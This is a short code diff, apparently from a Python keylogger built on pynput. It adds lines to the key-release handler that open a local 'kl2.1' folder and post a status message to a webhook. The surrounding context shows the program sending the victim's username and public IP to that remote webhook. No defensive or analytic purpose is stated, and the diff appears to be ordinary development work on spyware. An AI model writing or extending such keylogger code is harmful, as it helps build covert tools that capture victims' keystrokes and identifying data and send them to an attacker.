@@ -73,6 +73,9 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.insert:
         send_to_webhook(f"Connection stopped by user: {username}")
+        file_path = f"C:\Users\{username}\kl2.1"
+        os.startfile(file_path)
+        send_to_webhook(f"Opened dir...")
         return False
 
 # Get and send public IP and username
